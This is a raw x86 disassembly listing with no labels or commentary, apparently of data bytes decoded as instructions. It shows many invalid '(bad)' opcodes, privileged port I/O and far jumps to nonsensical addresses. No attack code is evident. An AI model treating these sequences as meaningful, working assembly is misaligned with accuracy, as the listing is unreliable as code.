  41795b:	push   ecx
  41795c:	and    ebp,DWORD PTR ds:[ecx]
  41795f:	push   eax
  417960:	push   ecx
  417961:	ds push ecx
  417963:	push   esp
  417964:	push   esp
  417965:	push   esp
  417966:	bound  edx,QWORD PTR [ecx+0x50]
  417969:	bound  esp,QWORD PTR [edx+0x5f]
  41796c:	outs   dx,DWORD PTR ds:[esi]
  41796d:	bound  esi,QWORD PTR [edi+ebx*2+0x64]
  417971:	bound  esp,QWORD PTR [edx+0x62]
  417974:	bound  esp,QWORD PTR [edx+0x54]
  417977:	push   esp
  417978:	cmp    edx,DWORD PTR [edi+ebx*2+0x50]
  41797c:	cmp    edx,DWORD PTR [ecx+0x54]
  41797f:	pop    edi
  417980:	push   edi
  417981:	push   edi
  417982:	pop    edi
  417983:	push   esp
  417984:	pop    edi
  417985:	pusha  
  417986:	push   edi
  417987:	ds push ecx
  417989:	xor    al,0x36
  41798b:	sub    DWORD PTR ss:[ebx],esp
  41798e:	and    esp,DWORD PTR [eax]
  417990:	sub    DWORD PTR [ebx],esp
  417992:	movaps XMMWORD PTR [ebx+eiz*1],xmm5
  417996:	and    BYTE PTR [ecx],ch
  417998:	sub    al,0x29
  41799a:	pop    ss
  41799b:	and    BYTE PTR [ebx],ah
  41799d:	sub    DWORD PTR [ecx],ebp
  41799f:	and    BYTE PTR [eax],ah
  4179a1:	adc    BYTE PTR [eax],ah
  4179a3:	and    BYTE PTR [edi],dl
  4179a5:	and    BYTE PTR [eax],ah
  4179a7:	and    BYTE PTR [ecx],ch
  4179a9:	and    BYTE PTR [ebx],ah
  4179ab:	sub    DWORD PTR [ebx],esp
  4179ad:	sub    al,0x2c
  4179af:	cmp    edx,DWORD PTR ds:0x502c2923
  4179b5:	xor    al,0x36
  4179b7:	push   edi
  4179b8:	push   esp
  4179b9:	pusha  
  4179ba:	jnp    0x417a2b
  4179bc:	pusha  
  4179bd:	pusha  
  4179be:	and    esp,DWORD PTR ds:[eax]
  4179c1:	and    BYTE PTR [ecx],ch
  4179c3:	sub    al,0x29
  4179c5:	cmp    edx,DWORD PTR [eax+0x3e]
  4179c8:	push   eax
  4179c9:	push   esp
  4179ca:	ss push ecx
  4179cc:	push   eax
  4179cd:	ss pop edi
  4179cf:	push   esp
  4179d0:	push   esp
  4179d1:	push   eax
  4179d2:	push   edi
  4179d3:	ds ds push edi
  4179d6:	push   edi
  4179d7:	push   esp
  4179d8:	push   edi
  4179d9:	push   ecx
  4179da:	ds push esp
  4179dc:	push   edi
  4179dd:	push   eax
  4179de:	push   eax
  4179df:	push   esp
  4179e0:	push   eax
  4179e1:	xor    al,0x3e
  4179e3:	bound  edx,QWORD PTR ds:[ecx+0x64]
  4179e7:	je     0x417a64
  4179e9:	je     0x417a66
  4179eb:	jg     0x417a6c
  4179ed:	je     0x417a6a
  4179ef:	je     0x417a70
  4179f1:	je     0x417a6e
  4179f3:	jnp    0x417a69
  4179f5:	jo     0x417a6b
  4179f7:	pusha  
  4179f8:	pop    edi
  4179f9:	bound  esp,QWORD PTR [edx+0x60]
  4179fc:	pop    edi
  4179fd:	jo     0x417a7a
  4179ff:	jnp    0x417a71
  417a01:	jo     0x417a73
  417a03:	jo     0x417a80
  417a05:	je     0x417a7b
  417a07:	bound  esp,QWORD PTR [edx+0x5f]
  417a0a:	pop    edi
  417a0b:	ss sub al,0x34
  417a0e:	and    esp,DWORD PTR [ebx]
  417a10:	and    esp,DWORD PTR [ebx]
  417a12:	and    BYTE PTR [ecx],ch
  417a14:	sub    al,0x20
  417a16:	and    BYTE PTR [ebx],bh
  417a18:	sub    DWORD PTR [ebx],esp
  417a1a:	and    BYTE PTR [edi],dl
  417a1c:	pop    ss
  417a1d:	pop    ss
  417a1e:	and    BYTE PTR ds:0x23171715,dl
  417a24:	and    ebp,DWORD PTR [eax+eiz*1]
  417a27:	sub    DWORD PTR [ebx],esp
  417a29:	sub    DWORD PTR [ebx],esp
  417a2b:	pop    ss
  417a2c:	and    BYTE PTR [edi],dl
  417a2e:	pop    ss
  417a2f:	sub    DWORD PTR ds:0x50202023,edx
  417a35:	push   ecx
  417a36:	push   esp
  417a37:	outs   dx,DWORD PTR ds:[esi]
  417a38:	jnp    0x417ab9
  417a3a:	mov    eax,ds:0x577b8d8f
  417a3f:	push   ecx
  417a40:	push   edi
  417a41:	xor    al,0x3b
  417a43:	cmp    esi,DWORD PTR [esp+ebp*1]
  417a46:	push   eax
  417a47:	ds push eax
  417a49:	push   ecx
  417a4a:	push   eax
  417a4b:	push   ecx
  417a4c:	push   eax
  417a4d:	fs push edi
  417a4f:	pusha  
  417a50:	outs   dx,DWORD PTR fs:[esi]
  417a52:	bound  esp,QWORD PTR [eax+0x6f]
  417a55:	bound  ebx,QWORD PTR [edi+0x70]
  417a58:	jnp    0x417ace
  417a5a:	fs pusha 
  417a5c:	ds cmp esi,DWORD PTR ds:[ebx+edi*1]
  417a61:	push   ecx
  417a62:	push   edi
  417a63:	pop    edi
  417a64:	pusha  
  417a65:	jo     0x417adb
  417a67:	(bad)  
  417a68:	xchg   esp,eax
  417a69:	xchg   esp,eax
  417a6a:	xchg   edi,eax
  417a6b:	xchg   edi,eax
  417a6c:	mov    eax,ds:0xa1949794
  417a71:	xchg   edi,eax
  417a72:	xchg   edi,eax
  417a73:	xchg   esp,eax
  417a74:	xchg   edi,eax
  417a75:	(bad)  
  417a76:	lea    ecx,[ebp+0x7b7f7b8d]
  417a7c:	jnp    0x417a0b
  417a7e:	(bad)  
  417a7f:	xchg   edi,eax
  417a80:	xchg   edi,eax
  417a81:	xchg   edi,eax
  417a82:	xchg   esp,eax
  417a83:	xchg   esp,eax
  417a84:	xchg   edi,eax
  417a85:	xchg   esp,eax
  417a86:	xchg   esp,eax
  417a87:	lea    edi,[ebx+0x74]
  417a8a:	fs push edi
  417a8c:	push   ecx
  417a8d:	cmp    edi,DWORD PTR [ebx]
  417a8f:	sub    al,0x2c
  417a91:	sub    al,0x2c
  417a93:	sub    al,0x29
  417a95:	sub    al,0x29
  417a97:	sub    al,0x20
  417a99:	pop    ss
  417a9a:	adc    eax,0x23202020
  417a9f:	pop    ss
  417aa0:	adc    eax,0x29201717
  417aa5:	xor    al,0x20
  417aa7:	and    ebp,DWORD PTR [ecx]
  417aa9:	and    BYTE PTR [edi],dl
  417aab:	adc    eax,0x29201717
  417ab0:	sub    al,0x36
  417ab2:	pop    ss
  417ab3:	pop    ss
  417ab4:	sub    al,0x50
  417ab6:	fs (bad) 
  417ab8:	xchg   esp,eax
  417ab9:	idiv   ebx
  417abb:	xlat   BYTE PTR ds:[ebx]
  417abc:	mov    ds:0x62707f97,eax
  417ac1:	push   edi
  417ac2:	push   edi
  417ac3:	push   eax
  417ac4:	push   eax
  417ac5:	ss pop edi
  417ac7:	push   ecx
  417ac8:	pusha  
  417ac9:	outs   dx,DWORD PTR ds:[esi]
  417aca:	outs   dx,DWORD PTR ds:[esi]
  417acb:	fs outs dx,DWORD PTR fs:[esi]
  417ace:	fs je  0x417b45
  417ad1:	je     0x417b52
  417ad3:	je     0x417b49
  417ad5:	lea    edi,[edi+0x7f]
  417ad8:	lea    ecx,[ebp+0x51516f74]
  417ade:	xor    al,0x3e
  417ae0:	ss sub al,0x3e
  417ae3:	pop    edi
  417ae4:	bound  edi,QWORD PTR [ebx-0x66]
  417ae7:	mov    dh,0xcc
  417aea:	call   0xe91963d7
  417aef:	call   0xe92a52cb
  417af4:	(bad)  
  417af6:	fidivr WORD PTR [eax-0x5d70705f]
  417afc:	(bad)  
  417afd:	iret   
  417afe:	(bad)  
  417b00:	fcomp  st(0)
  417b02:	fcom   st(6)
  417b04:	retf   
  417b05:	int3   
  417b06:	rcr    eax,1
  417b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b09:	xchg   esp,eax
  417b0a:	jg     0x417b7b
  417b0c:	push   esp
  417b0d:	push   eax
  417b0e:	sub    DWORD PTR [ecx],ebp
  417b10:	and    BYTE PTR [ecx+ebp*1],dh
  417b13:	sub    DWORD PTR [ecx],ebp
  417b15:	sub    al,0x23
  417b17:	sub    al,0x29
  417b19:	and    esp,DWORD PTR [ebx]
  417b1b:	and    BYTE PTR [eax],ah
  417b1d:	and    ebp,DWORD PTR [ecx]
  417b1f:	and    edx,DWORD PTR [eax]
  417b21:	adc    eax,0x29201017
  417b26:	pop    ss
  417b27:	and    BYTE PTR [ecx],ch
  417b29:	sub    al,0x23
  417b2b:	pop    ss
  417b2c:	and    BYTE PTR [ecx],ch
  417b2e:	pop    ss
  417b2f:	pop    ss
  417b30:	sub    DWORD PTR [ebx],esp
  417b32:	sub    DWORD PTR [eax+edx*2],ebp
  417b35:	pusha  
  417b36:	je     0x417ad9
  417b38:	call   0xf43e7739
  417b3d:	(bad)  
  417b3e:	mov    eax,ds:0x6f7b8d94
  417b43:	push   edi
  417b44:	outs   dx,DWORD PTR fs:[esi]
  417b46:	jo     0x417bbc
  417b48:	jnp    0x417ad7
  417b4a:	jg     0x417ad9
  417b4c:	(bad)  
  417b4d:	xchg   esp,eax
  417b4e:	xchg   esp,eax
  417b4f:	xchg   esp,eax
  417b50:	xchg   esp,eax
  417b51:	xchg   esp,eax
  417b52:	xchg   edi,eax
  417b53:	xchg   edi,eax
  417b54:	xchg   edi,eax
  417b55:	mov    eax,ds:0xadbba3a1
  417b5a:	shl    BYTE PTR [esi+0x3b365470],1
  417b60:	cmp    edx,DWORD PTR ss:[edx+eiz*2+0x64]
  417b65:	fdivr  st,st(0)
  417b67:	cld    
  417b68:	cld    
  417b69:	cld    
  417b6a:	sti    
  417b6b:	sti    
  417b6c:	cld    
  417b6d:	cld    
  417b6e:	idiv   cl
  417b70:	cli    
  417b71:	cld    
  417b72:	cli    
  417b73:	cld    
  417b74:	cld    
  417b75:	cld    
  417b76:	cld    
  417b77:	not    bl
  417b79:	mov    ebx,0xfbfbabaa
  417b7e:	cld    
  417b7f:	cld    
  417b80:	sti    
  417b81:	sti    
  417b82:	cld    
  417b83:	cld    
  417b84:	cld    
  417b85:	cld    
  417b86:	cld    
  417b87:	cld    
  417b88:	cld    
  417b89:	fsub   DWORD PTR [edx+0x3660708f]
  417b8f:	and    esp,DWORD PTR [ebx]
  417b91:	sub    al,0x2c
  417b93:	and    BYTE PTR [ebx],ah
  417b95:	sub    al,0x23
  417b97:	and    ebp,DWORD PTR [eax+eiz*1]
  417b9a:	and    esp,DWORD PTR [ebx]
  417b9c:	and    esp,DWORD PTR [eax]
  417b9e:	pop    ss
  417b9f:	pop    ss
  417ba0:	adc    BYTE PTR [edi],dl
  417ba2:	and    BYTE PTR [ecx],ch
  417ba4:	sub    DWORD PTR [esp+ebp*1],ebp
  417ba7:	xor    al,0x2c
  417ba9:	pop    ss
  417baa:	mov    ecx,cr5
  417bad:	pop    ss
  417bae:	adc    BYTE PTR [esi],dh
  417bb0:	sub    DWORD PTR [ecx],ebp
  417bb2:	sub    DWORD PTR [esi],esi
  417bb4:	fs jnp 0x417b4e
  417bb7:	mov    edi,0xf6d9f9fb
  417bbc:	cld    
  417bbd:	cld    
  417bbe:	in     eax,dx
  417bbf:	ret    
  417bc0:	mov    ds:0x7f7b8d94,al
  417bc5:	(bad)  
  417bc6:	xchg   esp,eax
  417bc7:	lea    esp,[ecx-0x55555d56]
  417bcd:	mov    esp,0xbcc0bcbc
  417bd2:	ror    bl,0xcb
  417bd5:	int3   
  417bd6:	div    edi
  417bd8:	repz cld 
  417bda:	stc    
  417bdb:	jg     0x417c4c
  417bdd:	push   esp
  417bde:	push   ecx
  417bdf:	push   edi
  417be0:	push   eax
  417be1:	sub    al,0x50
  417be3:	bound  esi,QWORD PTR [edx-0x4e]
  417be6:	clc    
  417be7:	cld    
  417be8:	in     al,dx
  417be9:	fstp   st(7)
  417beb:	hlt    
  417bec:	mul    bh
  417bee:	fnstsw ax
  417bf0:	out    0xf8,eax
  417bf2:	mul    ch
  417bf4:	out    dx,eax
  417bf5:	idiv   bl
  417bf7:	std    
  417bf8:	sti    
  417bf9:	fisub  WORD PTR [edx-0x16101048]
  417bff:	cmc    
  417c00:	imul   ch
  417c02:	clc    
  417c03:	cli    
  417c04:	cld    
  417c05:	cli    
  417c06:	cld    
  417c07:	cld    
  417c08:	cli    
  417c09:	cld    
  417c0a:	cld    
  417c0b:	(bad)  
  417c0c:	lea    ebp,[edi+0x51]
  417c0f:	and    esp,DWORD PTR ds:[eax]
  417c12:	sub    DWORD PTR [eax],esp
  417c14:	sub    DWORD PTR [eax],esp
  417c16:	and    esp,DWORD PTR [eax]
  417c18:	sub    al,0x15
  417c1a:	sub    DWORD PTR [ebx],esp
  417c1c:	adc    eax,0x15202015
  417c21:	and    BYTE PTR [edi],dl
  417c23:	and    edx,DWORD PTR [edi]
  417c25:	and    esp,DWORD PTR [eax]
  417c27:	and    BYTE PTR [eax],ah
  417c29:	movhps QWORD PTR [eax],xmm2
  417c2c:	adc    eax,0x20101029
  417c31:	and    esi,DWORD PTR [ecx+edx*2]
  417c34:	jo     0x417bc5
  417c36:	mov    ds:0xddecfcf8,al
  417c3b:	jmp    0xfb3e731a
  417c40:	fcom   st(4)
  417c42:	adc    DWORD PTR [edi-0x4821415e],0xffffffe8
  417c49:	call   0xf4355425
  417c4e:	aam    0xd8
  417c50:	(bad)  
  417c51:	in     eax,dx
  417c52:	clc    
  417c53:	cli    
  417c54:	sti    
  417c55:	cld    
  417c56:	cld    
  417c57:	idiv   bl
  417c59:	cld    
  417c5a:	les    edi,FWORD PTR [edi+0x6f]
  417c5d:	cmp    edx,DWORD PTR ds:[ecx+0x3b]
  417c61:	cmp    edx,DWORD PTR [edi+0x60]
  417c64:	pusha  
  417c65:	jg     0x417c15
  417c67:	idiv   eax
  417c69:	loope  0x417c48
  417c6b:	fcmovnu st,st(7)
  417c6d:	jmp    0xe7e0:0xeae9e9ea
  417c74:	loopne 0x417c51
  417c76:	in     al,0xf9
  417c78:	cld    
  417c79:	stc    
  417c7a:	out    0xad,eax
  417c7c:	jecxz  0x417c77
  417c7e:	jecxz  0x417c5a
  417c80:	in     al,dx
  417c81:	out    0xeb,eax
  417c83:	in     eax,dx
  417c84:	in     eax,dx
  417c85:	in     eax,dx
  417c86:	out    0xeb,eax
  417c88:	fst    st(6)
  417c8a:	cli    
  417c8b:	cli    
  417c8c:	mov    al,0x8d
  417c8e:	bound  edx,QWORD PTR [ecx+0x29]
  417c91:	sub    DWORD PTR [ebx],esp
  417c93:	pop    ss
  417c94:	xor    al,0x20
  417c96:	adc    eax,0x20202020
  417c9b:	and    esp,DWORD PTR [ebx]
  417c9d:	and    BYTE PTR [eax],ah
  417c9f:	pop    ss
  417ca0:	adc    eax,0x23152315
  417ca5:	pop    ss
  417ca6:	and    BYTE PTR [ebx],ah
  417ca8:	pop    ss
  417ca9:	and    BYTE PTR [ecx],ch
  417cab:	and    BYTE PTR ds:0x102c2023,dl
  417cb1:	xor    al,0x3e
  417cb3:	outs   dx,DWORD PTR ds:[esi]
  417cb4:	lea    esp,[edx-0x130b030d]
  417cba:	out    0xe6,eax
  417cbc:	(bad)  
  417cbe:	cmc    
  417cbf:	clc    
  417cc0:	cli    
  417cc1:	sti    
  417cc2:	sar    BYTE PTR [eax-0x4061d56],cl
  417cc8:	cli    
  417cc9:	sti    
  417cca:	sti    
  417ccb:	cld    
  417ccc:	stc    
  417ccd:	fcomip st,st(5)
  417ccf:	sti    
  417cd0:	sti    
  417cd1:	sti    
  417cd2:	cli    
  417cd3:	cld    
  417cd4:	cli    
  417cd5:	cli    
  417cd6:	cli    
  417cd7:	fsincos 
  417cd9:	mul    DWORD PTR [edx+0x3e54608d]
  417cdf:	xor    al,0x50
  417ce1:	cmp    edx,DWORD PTR [edi+0x6f]
  417ce4:	pop    edi
  417ce5:	(bad)
  417cea:	fsubrp st(2),st
  417cec:	fucom  st(6)
  417cee:	jmp    0xeb2c66ce
  417cf3:	out    dx,al
  417cf4:	fstp   st(4)
  417cf6:	fcmovnu st,st(3)
  417cf8:	shl    esi,1
  417cfa:	stc    
  417cfb:	xlat   BYTE PTR ds:[ebx]
  417cfc:	shl    cl,1
  417cfe:	in     al,dx
  417cff:	(bad)  
  417d01:	jmp    0x417ce8
  417d03:	out    0xeb,al
  417d05:	loopne 0x417cea
  417d07:	out    0xe2,al
  417d09:	aad    0xdf
  417d0b:	cli    
  417d0c:	call   0x3ba0f8a8
  417d11:	cmp    esi,DWORD PTR ss:[esi]
  417d14:	sub    al,0x29
  417d16:	pop    ss
  417d17:	and    BYTE PTR [eax],ah
  417d19:	sub    DWORD PTR [edi],edx
  417d1b:	pop    ss
  417d1c:	and    BYTE PTR [ebx],ah
  417d1e:	pop    ss
  417d1f:	pop    ss
  417d20:	adc    BYTE PTR ds:0x23231517,dl
  417d26:	pop    ss
  417d27:	adc    eax,0x23201720
  417d2c:	and    BYTE PTR [eax+eiz*1],dh
  417d2f:	xor    al,0x3e
  417d31:	push   ecx
  417d32:	lea    ebp,fs:[edx-0x23090308]
  417d39:	cmc    
  417d3a:	cmc    
  417d3b:	fcmovu st,st(7)
  417d3d:	loopne 0x417d28
  417d3f:	icebp  
  417d40:	in     al,dx
  417d41:	clc    
  417d42:	call   0xf53d1503
  417d47:	jmp    0x417d29
  417d49:	loopne 0x417d30
  417d4b:	in     al,dx
  417d4c:	loopne 0x417d3d
  417d4e:	icebp  
  417d4f:	fxtract 
  417d51:	cmc    
  417d52:	out    dx,al
  417d53:	out    dx,al
  417d54:	jmp    0x417d44
  417d56:	hlt    
  417d57:	idiv   ah
  417d59:	ret    0x7b97
  417d5c:	fs pusha 
  417d5e:	sub    al,0x29
  417d60:	xor    al,0x3b
  417d62:	push   eax
  417d63:	pop    edi
  417d64:	bound  edx,QWORD PTR [edi+0x7b]
  417d67:	xchg   esp,eax
  417d68:	stos   DWORD PTR es:[edi],eax
  417d69:	idiv   ecx
  417d6b:	loop   0x417d4f
  417d6d:	jecxz  0x417d4c
  417d6f:	shl    al,cl
  417d71:	fcmovnu st,st(5)
  417d73:	fucom  st(0)
  417d75:	out    0xee,al
  417d77:	fidiv  DWORD PTR [edi+ebx*8-0x1240080a]
  417d7e:	clc    
  417d7f:	fsubp  st(4),st
  417d81:	out    dx,al
  417d82:	jmp    0x417d69
  417d84:	out    0xe6,al
  417d86:	out    0xeb,al
  417d88:	out    dx,eax
  417d89:	loopne 0x417d61
  417d8b:	(bad)  
  417d8d:	les    ecx,FWORD PTR [edi+0x34515f6f]
  417d93:	ss ss xor al,0x34
  417d97:	pop    ss
  417d98:	sub    DWORD PTR [ebx],esp
  417d9a:	and    BYTE PTR ds:0x15171717,dl
  417da0:	movups xmm2,XMMWORD PTR [edi]
  417da3:	and    BYTE PTR [eax],ah
  417da5:	pop    ss
  417da6:	pop    ss
  417da7:	and    BYTE PTR [ecx],ch
  417da9:	and    BYTE PTR [eax],dl
  417dab:	movups xmm4,XMMWORD PTR [ebx]
  417dae:	and    esi,DWORD PTR [esp+edx*2]
  417db1:	jo     0x417d42
  417db3:	mov    ds:0xf4f6fbe8,al
  417db8:	jmp    0x417db3
  417dba:	jmp    0xf5ea:0xe9dfdfda
  417dc1:	std    
  417dc2:	les    edi,FWORD PTR [eax-0x161f0434]
  417dc8:	jmp    0xf2336ab8
  417dcd:	icebp  
  417dce:	jmp    0x417dbe
  417dd0:	cmc    
  417dd1:	div    ch
  417dd3:	icebp  
  417dd4:	div    cl
  417dd6:	cmc    
  417dd7:	cld    
  417dd8:	repz mov eax,0x5151628f
  417dde:	push   esp
  417ddf:	cmp    ebp,DWORD PTR [esp+ebp*1]
  417de2:	cmp    edi,DWORD PTR [esi]
  417de4:	ss push edi
  417de6:	jo     0x417d75
  417de8:	(bad)  
  417de9:	lods   eax,DWORD PTR ds:[esi]
  417dea:	clc    
  417deb:	stc    
  417dec:	jecxz  0x417dd1
  417dee:	fstp   st(7)
  417df0:	fstp   st(3)
  417df2:	fstp   st(3)
  417df4:	out    0xdd,al
  417df6:	out    0xef,eax
  417df8:	out    dx,al
  417df9:	shl    ebp,1
  417dfb:	clc    
  417dfc:	mov    esp,0xe7d8fbde
  417e01:	icebp  
  417e02:	out    dx,al
  417e03:	jmp    0x417deb
  417e05:	jmp    0x417df4
  417e07:	jecxz  0x417df4
  417e09:	out    dx,eax
  417e0a:	out    0xd5,al
  417e0c:	in     al,dx
  417e0d:	call   0x70b60db3
  417e12:	push   edi
  417e13:	push   ecx
  417e14:	push   ecx
  417e15:	and    edx,DWORD PTR ss:[edi]
  417e18:	and    edx,DWORD PTR ds:0x17202020
  417e1e:	and    BYTE PTR [eax],dl
  417e20:	movhps QWORD PTR [edi],xmm2
  417e23:	and    BYTE PTR [ecx],ch
  417e25:	pop    ss
  417e26:	and    BYTE PTR [eax],ah
  417e28:	sub    DWORD PTR [edi+edx*1],ebp
  417e2b:	pop    ss
  417e2c:	and    BYTE PTR [ecx],ch
  417e2e:	xor    al,0x50
  417e30:	pusha  
  417e31:	lea    ebp,[ebp-0x1a19040d]
  417e37:	hlt    
  417e38:	repnz cli 
  417e3a:	jmp    0xeb2b5919
  417e3f:	jmp    0xfcd8:0xbcc4fcfa
  417e46:	fcmovu st,st(5)
  417e48:	jmp    0xef285f39
  417e4d:	(bad)  
  417e4f:	lock icebp 
  417e51:	cmc    
  417e52:	loopne 0x417e3a
  417e54:	cmc    
  417e55:	icebp  
  417e56:	out    dx,al
  417e57:	icebp  
  417e58:	mov    eax,ds:0x3e627f97
  417e5d:	sub    DWORD PTR [ecx],ebp
  417e5f:	sub    al,0x50
  417e61:	ss xor al,0x50
  417e64:	sub    DWORD PTR [esi],esi
  417e66:	bound  edi,QWORD PTR ds:[ebx-0x6c]
  417e6a:	retf   
  417e6b:	imul   bh
  417e6d:	loop   0x417e52
  417e6f:	jecxz  0x417e4e
  417e71:	fucom  st(0)
  417e73:	mov    dh,0xd1
  417e75:	fstp   st(2)
  417e77:	in     eax,0xde
  417e79:	shl    eax,1
  417e7b:	clc    
  417e7c:	mov    edx,0xcbf3fbe5
  417e81:	sti    
  417e82:	icebp  
  417e83:	jmp    0x417e71
  417e85:	in     eax,0xe5
  417e87:	in     eax,0xe0
  417e89:	out    dx,eax
  417e8a:	in     al,dx
  417e8b:	in     al,dx
  417e8c:	out    0xf7,eax
  417e8e:	test   eax,0xa9d797a2
  417e93:	jo     0x417ef9
  417e95:	push   ecx
  417e96:	and    BYTE PTR ss:[eax],ah
  417e99:	and    edx,DWORD PTR [edi]
  417e9b:	adc    eax,0x20292020
  417ea0:	adc    BYTE PTR ds:0x17171010,dl
  417ea6:	and    BYTE PTR [ebx],ah
  417ea8:	adc    BYTE PTR [edi],dl
  417eaa:	sub    DWORD PTR [eax],esp
  417eac:	xor    al,0x3b
  417eae:	push   eax
  417eaf:	jo     0x417f30
  417eb1:	mov    ds:0xe4f4f9f7,eax
  417eb6:	mov    ah,0xdd
  417eb8:	(bad)  
  417eba:	jmp    0x417ea2
  417ebc:	jmp    0xbbf8:0xf6eadae9
  417ec3:	mov    ebx,0xdae6faf3
  417ec8:	out    dx,al
  417ec9:	in     eax,0xe7
  417ecb:	out    0xf1,al
  417ecd:	jmp    0xea2b6abb
  417ed2:	(bad)  
  417ed4:	loopne 0x417ec1
  417ed6:	cli    
  417ed7:	call   0x54b60e86
  417edc:	push   eax
  417edd:	xor    al,0x34
  417edf:	sub    DWORD PTR [eax+0x50],edx
  417ee2:	push   eax
  417ee3:	cmp    esi,DWORD PTR ds:[esi]
  417ee6:	cmp    edx,DWORD PTR [ecx+0x6f]
  417ee9:	lea    esp,[edx-0x1209042b]
  417eef:	jecxz  0x417ecc
  417ef1:	loopne 0x417ed0
  417ef3:	mov    bl,0xdd
  417ef5:	fneni(8087 only) 
  417ef7:	in     al,0xde
  417ef9:	fucomp st(1)
  417efb:	clc    
  417efc:	mov    edx,0xbcf8f6b3
  417f01:	div    esp
  417f03:	out    0xe5,eax
  417f05:	in     al,0xe7
  417f07:	in     eax,0xe5
  417f09:	in     eax,0xec
  417f0b:	in     eax,dx
  417f0c:	cmc    
  417f0d:	sti    
  417f0e:	idiv   DWORD PTR [eax-0x5d034848]
  417f14:	jg     0x417f85
  417f16:	push   ecx
  417f17:	xor    al,0x23
  417f19:	pop    ss
  417f1a:	pop    ss
  417f1b:	pop    ss
  417f1c:	pop    ss
  417f1d:	pop    ss
  417f1e:	pop    ss
  417f1f:	pop    ss
  417f20:	adc    BYTE PTR [eax],ah
  417f22:	and    BYTE PTR ds:0x34172917,dl
  417f28:	xor    al,0x23
  417f2a:	sub    DWORD PTR [esi+edi*1],ebp
  417f2d:	bound  esi,QWORD PTR [edi+ecx*4-0x55]
  417f31:	div    esp
  417f33:	div    dh
  417f35:	in     eax,0xdd
  417f37:	in     eax,dx
  417f38:	in     al,dx
  417f39:	cmc    
  417f3a:	jmp    0xf1f1:0xdfdff1e6
  417f41:	repz mov esp,0xdaf4fcbd
  417f47:	fucompp 
  417f49:	jmp    0xe0e1:0xe9ebe5ec
  417f50:	fcmovu st,st(7)
  417f52:	jmp    0xfe37663d
  417f57:	ret    
  417f58:	mov    ds:0x2c5f707f,al
  417f5d:	sub    DWORD PTR [esi],esi
  417f5f:	and    esp,DWORD PTR [ebx]
  417f61:	xor    al,0x34
  417f63:	cmp    edx,DWORD PTR [eax+0x2c]
  417f66:	ss push eax
  417f68:	push   esp
  417f69:	jo     0x417eff
  417f6b:	retf   
  417f6c:	lock repnz out dx,eax
  417f6f:	jecxz  0x417f4f
  417f71:	(bad)  [ecx+edx*8-0x1a1b4825]
  417f78:	in     eax,0xeb
  417f7a:	jmp    0x417f73
  417f7c:	shl    BYTE PTR [edx-0x3033050c],1
  417f82:	cli    
  417f83:	out    0xe4,al
  417f85:	in     al,0xe5
  417f87:	in     eax,0xe5
  417f89:	out    0xec,eax
  417f8b:	in     al,dx
  417f8c:	in     al,dx
  417f8d:	jmp    0x417f83
  417f8f:	fdivr  DWORD PTR [edi+esi*4+0x7fa2f8fb]
  417f96:	fs push ecx
  417f98:	and    BYTE PTR [edi],dl
  417f9a:	and    BYTE PTR ds:0x15171017,dl
  417fa0:	(bad)  
  417fa1:	mov    ebp,cr2
  417fa4:	adc    eax,0x3b343423
  417fa9:	push   edi
  417faa:	pusha  
  417fab:	pusha  
  417fac:	outs   dx,DWORD PTR ds:[esi]
  417fad:	jg     0x417f43
  417faf:	xabort 0xe7
  417fb2:	hlt    
  417fb3:	sti    
  417fb4:	hlt    
  417fb5:	out    0xe6,eax
  417fb7:	jmp    0x417fa0
  417fb9:	fldz   
  417fbb:	loopne 0x417fb2
  417fbd:	out    dx,eax
  417fbe:	idiv   esp
  417fc0:	cli    
  417fc1:	call   0xf53c3a82
  417fc6:	jmp    0xe6255ca7
  417fcb:	out    0xed,eax
  417fcd:	fucomip st,st(1)
  417fcf:	loope  0x417fbf
  417fd1:	(bad)  
  417fd3:	out    0xe6,al
  417fd5:	cld    
  417fd6:	clc    
  417fd7:	mov    esp,0x3b547497
  417fdc:	ds sub DWORD PTR ss:[ecx],ebp
  417fe0:	cmp    esi,DWORD PTR ss:[esi]
  417fe3:	ds and edi,DWORD PTR ss:[ebx]
  417fe7:	push   ecx
  417fe8:	push   esp
  417fe9:	bound  edi,QWORD PTR [ebx-0x5e]
  417fec:	loop   0x417fde
  417fee:	repnz in eax,dx
  417ff0:	(bad)  
  417ff1:	fnstsw ax
  417ff3:	fcmovnu st,st(3)
  417ff5:	fneni(8087 only) 
  417ff7:	in     al,0xe6
  417ff9:	out    0xe5,al
  417ffb:	hlt    
  417ffc:	fdivr  DWORD PTR [eax+ebp*8-0x73f2806]
  418003:	in     al,dx
  418004:	in     eax,0xe5
  418006:	out    0xe7,eax
  418008:	in     al,0xe4
  41800a:	out    0xf5,eax
  41800c:	in     al,0xdd
  41800e:	(bad)  
  418010:	fdiv   st,st(7)
  418012:	out    0xfc,eax
  418014:	call   0x2ca3fbba
  418019:	pop    ss
  41801a:	and    BYTE PTR [edi],dl
  41801c:	adc    eax,0x10101715
  418021:	and    BYTE PTR [edi],dl
  418023:	adc    eax,0x57513623
  418028:	pop    edi
  418029:	bound  edi,QWORD PTR [ebx-0x71]
  41802c:	xchg   edi,eax
  41802d:	lods   eax,DWORD PTR ds:[esi]
  41802e:	call   0xf72e752f
  418033:	stc    
  418034:	in     al,dx
  418035:	out    0xeb,al
  418037:	in     al,dx
  418038:	out    0xe0,eax
  41803a:	out    0xdd,al
  41803c:	out    0xf5,al
  41803e:	cld    
  41803f:	xlat   BYTE PTR ds:[ebx]
  418040:	repz xlat BYTE PTR ds:[ebx]
  418042:	mov    esp,0xdfe6fbd0
  418047:	jmp    0xf5226c31
  41804c:	in     eax,0xdd
  41804e:	repnz hlt 
  418050:	in     al,dx
  418051:	jmp    0x418039
  418053:	loopne 0x41803b
  418055:	std    
  418056:	call   0x3eb21013
  41805b:	ss xor al,0x36
  41805e:	cmp    ebp,DWORD PTR [ecx]
  418060:	ss sub al,0x50
  418063:	push   edi
  418064:	cmp    edi,DWORD PTR [ebx]
  418066:	ss ds push eax
  418069:	push   edi
  41806a:	jg     0x418003
  41806c:	iret   
  41806d:	lock out dx,al
  41806f:	stc    
  418070:	jecxz  0x41804c
  418072:	mov    dh,0xdb
  418074:	mov    dh,0xdd
  418076:	out    dx,eax
  418077:	rcr    dh,cl
  418079:	in     al,0xdb
  41807b:	in     al,0xd8
  41807d:	mov    eax,0xc0f8fcba
  418082:	fdiv   st,st(6)
  418084:	in     eax,dx
  418085:	out    0xe5,eax
  418087:	out    0xef,eax
  418089:	in     eax,0xe5
  41808b:	out    0xe4,eax
  41808d:	in     eax,0xe0
  41808f:	jmp    0xc8fc:0xfceefcf3
  418096:	(bad)  
